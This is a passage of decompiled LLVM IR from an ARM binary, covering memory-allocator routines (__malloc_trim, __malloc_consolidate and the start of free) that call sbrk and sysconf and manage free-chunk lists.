  %v10_12f80 = phi i32 [ %arg1, %dec_label_pc_12f74 ], [ 0, %bb ]
  ret i32 %v10_12f80

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_12f90 = add i32 %arg2, 44
  %v2_12f90 = inttoptr i32 %v1_12f90 to i32*
  %v3_12f90 = load i32, i32* %v2_12f90, align 4
  %v12_12f94 = load i32, i32* @r7, align 4
  %v1_12f98 = add i32 %v3_12f90, 4
  %v2_12f98 = inttoptr i32 %v1_12f98 to i32*
  %v3_12f98 = load i32, i32* %v2_12f98, align 4
  %v1_12f9c = add i32 %arg2, 860
  %v2_12f9c = inttoptr i32 %v1_12f9c to i32*
  %v3_12f9c = load i32, i32* %v2_12f9c, align 4
  store i32 %v3_12f9c, i32* @r4, align 4
  %v1_12fa0 = and i32 %v3_12f98, -4
  store i32 %v1_12fa0, i32* @r6, align 4
  %v1_12fa4 = add i32 %v1_12fa0, -17
  %v2_12fa8 = add i32 %v1_12fa4, %v3_12f9c
  store i32 %arg2, i32* @r5, align 4
  %v2_12fb4 = sub i32 %v2_12fa8, %arg1
  store i32 %v3_12f9c, i32* %r1.global-to-local, align 4
  %v2_12fbc = udiv i32 %v2_12fb4, %v3_12f9c
  %v1_12fc0 = add i32 %v2_12fbc, -1
  store i32 %v1_12fc0, i32* %r0.global-to-local, align 4
  %v2_12fc4 = mul i32 %v1_12fc0, %v3_12f9c
  store i32 %v2_12fc4, i32* @r7, align 4
  %v2_12fc8 = icmp eq i32 %v2_12fc4, 0
  store i1 %v2_12fc8, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12fc4, 1
  br i1 %tmp8, label %dec_label_pc_13030, label %dec_label_pc_12fd0

dec_label_pc_12fd0:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12fd4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12fd4, i32* %r0.global-to-local, align 4
  %v0_12fd8 = load i32, i32* @r5, align 4
  %v1_12fd8 = add i32 %v0_12fd8, 44
  %v2_12fd8 = inttoptr i32 %v1_12fd8 to i32*
  %v3_12fd8 = load i32, i32* %v2_12fd8, align 4
  %v0_12fdc = load i32, i32* @r6, align 4
  %v2_12fdc = add i32 %v0_12fdc, %v3_12fd8
  %v9_12fe0 = icmp eq i32 %v1_12fd4, %v2_12fdc
  store i1 %v9_12fe0, i1* @cpsr_z, align 1
  store i32 %v1_12fd4, i32* @r4, align 4
  br i1 %v9_12fe0, label %dec_label_pc_12fec, label %dec_label_pc_13030

dec_label_pc_12fec:                               ; preds = %dec_label_pc_12fd0
  %v0_12fec = load i32, i32* @r7, align 4
  %v1_12fec = sub i32 0, %v0_12fec
  store i32 %v1_12fec, i32* %r0.global-to-local, align 4
  %v1_12ff0 = call i32 @__GI_sbrk(i32 %v1_12fec)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12ff8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12ff8, i32* %r0.global-to-local, align 4
  %v7_12ffc = icmp eq i32 %v1_12ff8, -1
  store i1 %v7_12ffc, i1* @cpsr_z, align 1
  br i1 %v7_12ffc, label %dec_label_pc_13030, label %dec_label_pc_13004

dec_label_pc_13004:                               ; preds = %dec_label_pc_12fec
  %v0_13004 = load i32, i32* @r4, align 4
  %v2_13004 = sub i32 %v0_13004, %v1_12ff8
  store i32 %v2_13004, i32* %r0.global-to-local, align 4
  %v9_13004 = icmp eq i32 %v0_13004, %v1_12ff8
  store i1 %v9_13004, i1* @cpsr_z, align 1
  br i1 %v9_13004, label %dec_label_pc_13030, label %dec_label_pc_1300c

dec_label_pc_1300c:                               ; preds = %dec_label_pc_13004
  %v0_1300c = load i32, i32* @r5, align 4
  %v1_1300c = add i32 %v0_1300c, 872
  %v2_1300c = inttoptr i32 %v1_1300c to i32*
  %v3_1300c = load i32, i32* %v2_1300c, align 4
  %v1_13010 = load i32, i32* @r6, align 4
  %v2_13010 = sub i32 %v1_13010, %v2_13004
  store i32 %v2_13010, i32* %r2.global-to-local, align 4
  %v1_13014 = add i32 %v0_1300c, 44
  %v2_13014 = inttoptr i32 %v1_13014 to i32*
  %v3_13014 = load i32, i32* %v2_13014, align 4
  store i32 %v3_13014, i32* %r1.global-to-local, align 4
  %v2_13018 = sub i32 %v3_1300c, %v2_13004
  %v1_1301c = or i32 %v2_13010, 1
  store i32 %v1_1301c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_13018, i32* %v2_1300c, align 4
  %v0_13028 = load i32, i32* %r2.global-to-local, align 4
  %v1_13028 = load i32, i32* %r1.global-to-local, align 4
  %v2_13028 = add i32 %v1_13028, 4
  %v3_13028 = inttoptr i32 %v2_13028 to i32*
  store i32 %v0_13028, i32* %v3_13028, align 4
  %v1_1303c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13034

dec_label_pc_13030:                               ; preds = %dec_label_pc_12fd0, %dec_label_pc_13004, %dec_label_pc_12fec, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13034

dec_label_pc_13034:                               ; preds = %dec_label_pc_1300c, %dec_label_pc_13030
  %v1_1303c = phi i32 [ %v1_1303c.pre, %dec_label_pc_1300c ], [ 0, %dec_label_pc_13030 ]
  store i32 %v12_12f94, i32* @r7, align 4
  ret i32 %v1_1303c

; uselistorder directives
  uselistorder i1 %v7_12ffc, { 1, 0 }
  uselistorder i32 %v1_12ff8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12f9c, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_13034, { 1, 0 }
  uselistorder label %dec_label_pc_13030, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13040 = load i32, i32* @r4, align 4
  store i32 %v3_13040, i32* %stack_var_-36, align 4
  %v0_13044 = load i32, i32* @r0, align 4
  %v1_13044 = inttoptr i32 %v0_13044 to i32*
  %v2_13044 = load i32, i32* %v1_13044, align 4
  store i32 %v2_13044, i32* %r3.global-to-local, align 4
  %v2_13048 = icmp eq i32 %v2_13044, 0
  store i32 %v0_13044, i32* @r4, align 4
  br i1 %v2_13048, label %dec_label_pc_13180.preheader, label %dec_label_pc_1305c

dec_label_pc_13180.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1318825 = add i32 %v0_13044, 52
  store i32 %v1_1318825, i32* %r3.global-to-local, align 4
  %v2_1319026 = add i32 %v0_13044, 60
  %v3_1319027 = inttoptr i32 %v2_1319026 to i32*
  store i32 %v1_1318825, i32* %v3_1319027, align 4
  %v0_1319428 = load i32, i32* %r3.global-to-local, align 4
  %v2_1319429 = add i32 %v0_1319428, 12
  %v3_1319430 = inttoptr i32 %v2_1319429 to i32*
  store i32 %v0_1319428, i32* %v3_1319430, align 4
  br label %dec_label_pc_13180.dec_label_pc_13180_crit_edge

dec_label_pc_1305c:                               ; preds = %entry
  %v1_1305c = and i32 %v2_13044, -3
  %v3_13060 = udiv i32 %v2_13044, 8
  store i32 %v3_13060, i32* %r2.global-to-local, align 4
  store i32 %v1_1305c, i32* %v1_13044, align 4
  %v0_13068 = load i32, i32* @r0, align 4
  %v1_13068 = add i32 %v0_13068, -4
  store i32 %v1_13068, i32* %r3.global-to-local, align 4
  %v1_1306c = load i32, i32* %r2.global-to-local, align 4
  %v4_1306c = mul i32 %v1_1306c, 4
  %v5_1306c = add i32 %v4_1306c, %v1_13068
  store i32 %v5_1306c, i32* %sb.global-to-local, align 4
  %v1_13070 = add i32 %v0_13068, 52
  store i32 %v1_13070, i32* %r7.global-to-local, align 4
  %v1_13074 = add i32 %v0_13068, 4
  store i32 %v1_13074, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1307c

dec_label_pc_1307c:                               ; preds = %dec_label_pc_13178, %dec_label_pc_1305c
  %v1_1317010 = phi i32 [ %v1_13170, %dec_label_pc_13178 ], [ %v5_1306c, %dec_label_pc_1305c ]
  %v1_13088 = phi i32 [ %v1_13178, %dec_label_pc_13178 ], [ %v1_13074, %dec_label_pc_1305c ]
  %v1_1307c = inttoptr i32 %v1_13088 to i32*
  %v2_1307c = load i32, i32* %v1_1307c, align 4
  store i32 %v2_1307c, i32* %r1.global-to-local, align 4
  %v2_13080 = icmp eq i32 %v2_1307c, 0
  br i1 %v2_13080, label %dec_label_pc_13170, label %dec_label_pc_13088

dec_label_pc_13088:                               ; preds = %dec_label_pc_1307c
  %v0_13088 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13088, i32* %v1_1307c, align 4
  %v0_1308c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1308c

dec_label_pc_1308c:                               ; preds = %dec_label_pc_13164, %dec_label_pc_13088
  %v0_130a8 = phi i32 [ %v0_13164, %dec_label_pc_13164 ], [ %v0_1308c.pre, %dec_label_pc_13088 ]
  %v1_1308c = add i32 %v0_130a8, 4
  %v2_1308c = inttoptr i32 %v1_1308c to i32*
  %v3_1308c = load i32, i32* %v2_1308c, align 4
  store i32 %v3_1308c, i32* %r3.global-to-local, align 4
  %v1_13090 = and i32 %v3_1308c, -2
  store i32 %v1_13090, i32* %lr.global-to-local, align 4
  %v2_13094 = add i32 %v1_13090, %v0_130a8
  store i32 %v2_13094, i32* @r0, align 4
  %v1_13098 = urem i32 %v3_1308c, 2
  %v2_13098 = icmp eq i32 %v1_13098, 0
  %v1_1309c = add i32 %v0_130a8, 8
  %v2_1309c = inttoptr i32 %v1_1309c to i32*
  %v3_1309c = load i32, i32* %v2_1309c, align 4
  store i32 %v3_1309c, i32* %sl.global-to-local, align 4
  %v1_130a0 = add i32 %v2_13094, 4
  %v2_130a0 = inttoptr i32 %v1_130a0 to i32*
  %v3_130a0 = load i32, i32* %v2_130a0, align 4
  store i32 %v3_130a0, i32* %r8.global-to-local, align 4
  br i1 %v2_13098, label %dec_label_pc_130a8, label %dec_label_pc_130dc

dec_label_pc_130a8:                               ; preds = %dec_label_pc_1308c
  %v1_130a8 = inttoptr i32 %v0_130a8 to i32*
  %v2_130a8 = load i32, i32* %v1_130a8, align 4
  store i32 %v2_130a8, i32* %r5.global-to-local, align 4
  %v2_130ac = sub i32 %v0_130a8, %v2_130a8
  store i32 %v2_130ac, i32* %r3.global-to-local, align 4
  %v1_130b0 = add i32 %v2_130ac, 8
  %v2_130b0 = inttoptr i32 %v1_130b0 to i32*
  %v3_130b0 = load i32, i32* %v2_130b0, align 4
  store i32 %v3_130b0, i32* @ip, align 4
  %v1_130b4 = add i32 %v3_130b0, 12
  %v2_130b4 = inttoptr i32 %v1_130b4 to i32*
  %v3_130b4 = load i32, i32* %v2_130b4, align 4
  store i32 %v3_130b4, i32* %r1.global-to-local, align 4
  %v9_130b8 = icmp eq i32 %v3_130b4, %v2_130ac
  %v1_130bc = add i32 %v2_130ac, 12
  %v2_130bc = inttoptr i32 %v1_130bc to i32*
  %v3_130bc = load i32, i32* %v2_130bc, align 4
  store i32 %v3_130bc, i32* %r2.global-to-local, align 4
  br i1 %v9_130b8, label %dec_label_pc_130c4, label %dec_label_pc_13120

dec_label_pc_130c4:                               ; preds = %dec_label_pc_130a8
  %v1_130c4 = add i32 %v3_130bc, 8
  %v2_130c4 = inttoptr i32 %v1_130c4 to i32*
  %v3_130c4 = load i32, i32* %v2_130c4, align 4
  store i32 %v3_130c4, i32* %r3.global-to-local, align 4
  %v9_130c8 = icmp eq i32 %v3_130c4, %v2_130ac
  br i1 %v9_130c8, label %dec_label_pc_130d0, label %dec_label_pc_13120

dec_label_pc_130d0:                               ; preds = %dec_label_pc_130c4
  store i32 %v3_130b0, i32* %v2_130c4, align 4
  %v0_130d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_130d4 = load i32, i32* @ip, align 4
  %v2_130d4 = add i32 %v1_130d4, 12
  %v3_130d4 = inttoptr i32 %v2_130d4 to i32*
  store i32 %v0_130d4, i32* %v3_130d4, align 4
  %v0_130d8 = load i32, i32* %lr.global-to-local, align 4
  %v1_130d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_130d8 = add i32 %v1_130d8, %v0_130d8
  store i32 %v2_130d8, i32* %lr.global-to-local, align 4
  %v0_130e0.pre = load i32, i32* @r0, align 4
  %v0_130e4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_130dc

dec_label_pc_130dc:                               ; preds = %dec_label_pc_1308c, %dec_label_pc_130d0
  %v0_13154 = phi i32 [ %v1_13090, %dec_label_pc_1308c ], [ %v2_130d8, %dec_label_pc_130d0 ]
  %v0_130e4 = phi i32 [ %v3_130a0, %dec_label_pc_1308c ], [ %v0_130e4.pre, %dec_label_pc_130d0 ]
  %v1_130f8 = phi i32 [ %v2_13094, %dec_label_pc_1308c ], [ %v0_130e0.pre, %dec_label_pc_130d0 ]
  %v0_130dc = load i32, i32* @r4, align 4
  %v1_130dc = add i32 %v0_130dc, 44
  %v2_130dc = inttoptr i32 %v1_130dc to i32*
  %v3_130dc = load i32, i32* %v2_130dc, align 4
  store i32 %v3_130dc, i32* %r3.global-to-local, align 4
  %v9_130e0 = icmp eq i32 %v1_130f8, %v3_130dc
  %v1_130e4 = and i32 %v0_130e4, -4
  store i32 %v1_130e4, i32* %r5.global-to-local, align 4
  br i1 %v9_130e0, label %dec_label_pc_13154, label %dec_label_pc_130ec

dec_label_pc_130ec:                               ; preds = %dec_label_pc_130dc
  %v2_130ec = add i32 %v1_130f8, %v1_130e4
  store i32 %v2_130ec, i32* %r3.global-to-local, align 4
  %v1_130f0 = add i32 %v2_130ec, 4
  %v2_130f0 = inttoptr i32 %v1_130f0 to i32*
  %v3_130f0 = load i32, i32* %v2_130f0, align 4
  store i32 %v3_130f0, i32* %r3.global-to-local, align 4
  %v1_130f4 = urem i32 %v3_130f0, 2
  %v2_130f4 = icmp eq i32 %v1_130f4, 0
  %v2_130f8 = add i32 %v1_130f8, 4
  %v3_130f8 = inttoptr i32 %v2_130f8 to i32*
  store i32 %v1_130e4, i32* %v3_130f8, align 4
  br i1 %v2_130f4, label %dec_label_pc_13100, label %dec_label_pc_130ec.dec_label_pc_13130_crit_edge

dec_label_pc_130ec.dec_label_pc_13130_crit_edge:  ; preds = %dec_label_pc_130ec
  %v0_13134.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13130

dec_label_pc_13100:                               ; preds = %dec_label_pc_130ec
  %v0_13100 = load i32, i32* @r0, align 4
  %v1_13100 = add i32 %v0_13100, 8
  %v2_13100 = inttoptr i32 %v1_13100 to i32*
  %v3_13100 = load i32, i32* %v2_13100, align 4
  store i32 %v3_13100, i32* @ip, align 4
  %v1_13104 = add i32 %v3_13100, 12
  %v2_13104 = inttoptr i32 %v1_13104 to i32*
  %v3_13104 = load i32, i32* %v2_13104, align 4
  store i32 %v3_13104, i32* %r3.global-to-local, align 4
  %v9_13108 = icmp eq i32 %v3_13104, %v0_13100
  %v1_1310c = add i32 %v0_13100, 12
  %v2_1310c = inttoptr i32 %v1_1310c to i32*
  %v3_1310c = load i32, i32* %v2_1310c, align 4
  store i32 %v3_1310c, i32* %r2.global-to-local, align 4
  br i1 %v9_13108, label %dec_label_pc_13114, label %dec_label_pc_13120

dec_label_pc_13114:                               ; preds = %dec_label_pc_13100
  %v1_13114 = add i32 %v3_1310c, 8
  %v2_13114 = inttoptr i32 %v1_13114 to i32*
  %v3_13114 = load i32, i32* %v2_13114, align 4
  store i32 %v3_13114, i32* %r3.global-to-local, align 4
  %v9_13118 = icmp eq i32 %v3_13114, %v0_13100
  br i1 %v9_13118, label %dec_label_pc_13124, label %dec_label_pc_13120

dec_label_pc_13120:                               ; preds = %dec_label_pc_13100, %dec_label_pc_130c4, %dec_label_pc_130a8, %dec_label_pc_13114
  %v0_13120 = call i32 @abort()
  store i32 %v0_13120, i32* @r0, align 4
  %v0_13124.pre = load i32, i32* @ip, align 4
  %v1_13124.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13124

dec_label_pc_13124:                               ; preds = %dec_label_pc_13114, %dec_label_pc_13120
  %v1_13124 = phi i32 [ %v3_1310c, %dec_label_pc_13114 ], [ %v1_13124.pre, %dec_label_pc_13120 ]
  %v0_13124 = phi i32 [ %v3_13100, %dec_label_pc_13114 ], [ %v0_13124.pre, %dec_label_pc_13120 ]
  %v2_13124 = add i32 %v1_13124, 8
  %v3_13124 = inttoptr i32 %v2_13124 to i32*
  store i32 %v0_13124, i32* %v3_13124, align 4
  %v0_13128 = load i32, i32* %r2.global-to-local, align 4
  %v1_13128 = load i32, i32* @ip, align 4
  %v2_13128 = add i32 %v1_13128, 12
  %v3_13128 = inttoptr i32 %v2_13128 to i32*
  store i32 %v0_13128, i32* %v3_13128, align 4
  %v0_1312c = load i32, i32* %lr.global-to-local, align 4
  %v1_1312c = load i32, i32* %r5.global-to-local, align 4
  %v2_1312c = add i32 %v1_1312c, %v0_1312c
  store i32 %v2_1312c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13130

dec_label_pc_13130:                               ; preds = %dec_label_pc_130ec.dec_label_pc_13130_crit_edge, %dec_label_pc_13124
  %v0_13134 = phi i32 [ %v0_13134.pre, %dec_label_pc_130ec.dec_label_pc_13130_crit_edge ], [ %v2_1312c, %dec_label_pc_13124 ]
  %v0_13130 = load i32, i32* %r7.global-to-local, align 4
  %v1_13130 = add i32 %v0_13130, 8
  %v2_13130 = inttoptr i32 %v1_13130 to i32*
  %v3_13130 = load i32, i32* %v2_13130, align 4
  store i32 %v3_13130, i32* %r2.global-to-local, align 4
  %v1_13134 = or i32 %v0_13134, 1
  store i32 %v1_13134, i32* %r3.global-to-local, align 4
  %v0_13138 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13138, i32* %v2_13130, align 4
  %v0_1313c = load i32, i32* %r1.global-to-local, align 4
  %v1_1313c = load i32, i32* %r2.global-to-local, align 4
  %v2_1313c = add i32 %v1_1313c, 12
  %v3_1313c = inttoptr i32 %v2_1313c to i32*
  store i32 %v0_1313c, i32* %v3_1313c, align 4
  %v0_13140 = load i32, i32* %lr.global-to-local, align 4
  %v1_13140 = load i32, i32* %r1.global-to-local, align 4
  %v3_13140 = add i32 %v1_13140, %v0_13140
  %v4_13140 = inttoptr i32 %v3_13140 to i32*
  store i32 %v0_13140, i32* %v4_13140, align 4
  %v0_13144 = load i32, i32* %r3.global-to-local, align 4
  %v1_13144 = load i32, i32* %r1.global-to-local, align 4
  %v2_13144 = add i32 %v1_13144, 4
  %v3_13144 = inttoptr i32 %v2_13144 to i32*
  store i32 %v0_13144, i32* %v3_13144, align 4
  %v0_13148 = load i32, i32* %r2.global-to-local, align 4
  %v1_13148 = load i32, i32* %r1.global-to-local, align 4
  %v2_13148 = add i32 %v1_13148, 8
  %v3_13148 = inttoptr i32 %v2_13148 to i32*
  store i32 %v0_13148, i32* %v3_13148, align 4
  %v0_1314c = load i32, i32* %r7.global-to-local, align 4
  %v1_1314c = load i32, i32* %r1.global-to-local, align 4
  %v2_1314c = add i32 %v1_1314c, 12
  %v3_1314c = inttoptr i32 %v2_1314c to i32*
  store i32 %v0_1314c, i32* %v3_1314c, align 4
  br label %dec_label_pc_13164

dec_label_pc_13154:                               ; preds = %dec_label_pc_130dc
  %v2_13154 = add i32 %v1_130e4, %v0_13154
  %v1_13158 = or i32 %v2_13154, 1
  store i32 %v1_13158, i32* %r3.global-to-local, align 4
  %v1_1315c = load i32, i32* %r1.global-to-local, align 4
  %v2_1315c = add i32 %v1_1315c, 4
  %v3_1315c = inttoptr i32 %v2_1315c to i32*
  store i32 %v1_13158, i32* %v3_1315c, align 4
  %v0_13160 = load i32, i32* %r1.global-to-local, align 4
  %v1_13160 = load i32, i32* @r4, align 4
  %v2_13160 = add i32 %v1_13160, 44
  %v3_13160 = inttoptr i32 %v2_13160 to i32*
  store i32 %v0_13160, i32* %v3_13160, align 4
  br label %dec_label_pc_13164

dec_label_pc_13164:                               ; preds = %dec_label_pc_13130, %dec_label_pc_13154
  %v0_13164 = load i32, i32* %sl.global-to-local, align 4
  %v2_13164 = icmp eq i32 %v0_13164, 0
  store i32 %v0_13164, i32* %r1.global-to-local, align 4
  br i1 %v2_13164, label %dec_label_pc_13170.loopexit, label %dec_label_pc_1308c

dec_label_pc_13170.loopexit:                      ; preds = %dec_label_pc_13164
  %v0_13170.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_13170.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13170

dec_label_pc_13170:                               ; preds = %dec_label_pc_13170.loopexit, %dec_label_pc_1307c
  %v1_13170 = phi i32 [ %v1_13170.pre, %dec_label_pc_13170.loopexit ], [ %v1_1317010, %dec_label_pc_1307c ]
  %v0_13178 = phi i32 [ %v0_13170.pre, %dec_label_pc_13170.loopexit ], [ %v1_13088, %dec_label_pc_1307c ]
  %v9_13170 = icmp eq i32 %v0_13178, %v1_13170
  br i1 %v9_13170, label %dec_label_pc_131e8, label %dec_label_pc_13178

dec_label_pc_13178:                               ; preds = %dec_label_pc_13170
  %v1_13178 = add i32 %v0_13178, 4
  store i32 %v1_13178, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1307c

dec_label_pc_13180.dec_label_pc_13180_crit_edge:  ; preds = %dec_label_pc_13180.preheader, %dec_label_pc_13180.dec_label_pc_13180_crit_edge
  %v0_13180.pre = load i32, i32* @r4, align 4
  %v1_13180.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13180 = mul i32 %v1_13180.pre, 8
  %v5_13180 = add i32 %v4_13180, %v0_13180.pre
  %v1_13184 = add i32 %v1_13180.pre, 1
  store i32 %v1_13184, i32* %r2.global-to-local, align 4
  %v1_13188 = add i32 %v5_13180, 44
  store i32 %v1_13188, i32* %r3.global-to-local, align 4
  %v2_13190 = add i32 %v5_13180, 52
  %v3_13190 = inttoptr i32 %v2_13190 to i32*
  store i32 %v1_13188, i32* %v3_13190, align 4
  %v0_13194 = load i32, i32* %r3.global-to-local, align 4
  %v2_13194 = add i32 %v0_13194, 12
  %v3_13194 = inttoptr i32 %v2_13194 to i32*
  store i32 %v0_13194, i32* %v3_13194, align 4
  %v7_13198 = icmp sgt i32 %v1_13184, 95
  br i1 %v7_13198, label %dec_label_pc_1319c, label %dec_label_pc_13180.dec_label_pc_13180_crit_edge

dec_label_pc_1319c:                               ; preds = %dec_label_pc_13180.dec_label_pc_13180_crit_edge
  %v0_1319c = load i32, i32* @r4, align 4
  %v1_1319c = inttoptr i32 %v0_1319c to i32*
  %v2_1319c = load i32, i32* %v1_1319c, align 4
  store i32 %v2_1319c, i32* %r2.global-to-local, align 4
  %v1_131a0 = add i32 %v0_1319c, 864
  %v2_131a0 = inttoptr i32 %v1_131a0 to i32*
  %v3_131a0 = load i32, i32* %v2_131a0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_131a8 = urem i32 %v2_1319c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_131b0 = or i32 %v3_131a0, 1
  store i32 %v1_131b0, i32* %r1.global-to-local, align 4
  %v1_131b4 = or i32 %v1_131a8, 72
  store i32 %v1_131b4, i32* %r2.global-to-local, align 4
  %v1_131b8 = add i32 %v0_1319c, 52
  store i32 %v1_131b8, i32* @ip, align 4
  %v2_131bc = add i32 %v0_1319c, 840
  %v3_131bc = inttoptr i32 %v2_131bc to i32*
  store i32 0, i32* %v3_131bc, align 4
  %v0_131c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_131c0 = add i32 %v0_131c0, 65536
  store i32 %v1_131c0, i32* %r3.global-to-local, align 4
  %v0_131c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_131c4 = load i32, i32* @r4, align 4
  %v2_131c4 = add i32 %v1_131c4, 836
  %v3_131c4 = inttoptr i32 %v2_131c4 to i32*
  store i32 %v0_131c4, i32* %v3_131c4, align 4
  %v0_131c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_131c8 = load i32, i32* @r4, align 4
  %v2_131c8 = add i32 %v1_131c8, 844
  %v3_131c8 = inttoptr i32 %v2_131c8 to i32*
  store i32 %v0_131c8, i32* %v3_131c8, align 4
  %v1_131cc = load i32, i32* @r4, align 4
  %v2_131cc = add i32 %v1_131cc, 852
  %v3_131cc = inttoptr i32 %v2_131cc to i32*
  store i32 %v1_131c0, i32* %v3_131cc, align 4
  %v1_131d0 = load i32, i32* @r4, align 4
  %v2_131d0 = add i32 %v1_131d0, 864
  %v3_131d0 = inttoptr i32 %v2_131d0 to i32*
  store i32 %v1_131b0, i32* %v3_131d0, align 4
  %v1_131d4 = load i32, i32* @r4, align 4
  %v2_131d4 = inttoptr i32 %v1_131d4 to i32*
  store i32 %v1_131b4, i32* %v2_131d4, align 4
  %v0_131d8 = load i32, i32* @ip, align 4
  %v1_131d8 = load i32, i32* @r4, align 4
  %v2_131d8 = add i32 %v1_131d8, 44
  %v3_131d8 = inttoptr i32 %v2_131d8 to i32*
  store i32 %v0_131d8, i32* %v3_131d8, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_131e0 = call i32 @sysconf(i32 30, i32 %v1_131b0, i32 %v1_131b4, i32 %v1_131c0)
  store i32 %v4_131e0, i32* @r0, align 4
  %v1_131e4 = load i32, i32* @r4, align 4
  %v2_131e4 = add i32 %v1_131e4, 860
  %v3_131e4 = inttoptr i32 %v2_131e4 to i32*
  store i32 %v4_131e0, i32* %v3_131e4, align 4
  br label %dec_label_pc_131e8

dec_label_pc_131e8:                               ; preds = %dec_label_pc_13170, %dec_label_pc_1319c
  %v2_131ec = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_131ec, i32* @r4, align 4
  %v1_131f0 = load i32, i32* @r0, align 4
  ret i32 %v1_131f0

; uselistorder directives
  uselistorder i32 %v0_1319c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13194, { 1, 0 }
  uselistorder i32 %v1_13178, { 1, 0 }
  uselistorder i32 %v0_13164, { 0, 2, 1 }
  uselistorder i32 %v0_13140, { 1, 0 }
  uselistorder i32 %v1_13090, { 1, 0, 2 }
  uselistorder i32 %v0_130a8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13068, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 10, 0, 8, 9, 6, 7, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_131e8, { 1, 0 }
  uselistorder label %dec_label_pc_13180.dec_label_pc_13180_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13164, { 1, 0 }
  uselistorder label %dec_label_pc_13130, { 1, 0 }
  uselistorder label %dec_label_pc_13124, { 1, 0 }
  uselistorder label %dec_label_pc_13120, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_130dc, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_131f4 = load i32, i32* @r4, align 4
  %v6_131f4 = load i32, i32* @r5, align 4
  %v9_131f4 = load i32, i32* @r6, align 4
  %v12_131f4 = load i32, i32* @r7, align 4
  %v18_131f4 = load i32, i32* @lr, align 4
  %v0_131fc = load i32, i32* @r0, align 4
  store i32 %v0_131fc, i32* @r6, align 4
  %v2_131fc = icmp eq i32 %v0_131fc, 0
  %v2_13200 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r7, align 4
  br i1 %v2_131fc, label %dec_label_pc_13408, label %dec_label_pc_1320c

dec_label_pc_1320c:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
